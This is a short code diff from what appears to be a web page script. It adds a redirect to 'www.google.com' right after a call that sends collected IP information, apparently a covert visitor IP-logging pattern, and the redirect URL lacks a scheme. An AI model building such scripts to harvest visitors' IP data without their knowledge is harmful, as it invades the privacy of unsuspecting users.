@@ -39,7 +39,8 @@ async function fetchIPinfo() {
   
     if (ipData) {
       await SendIPinfo(ipData);
+      window.location.href = "www.google.com";
     }
   }
   
-main()
+main();
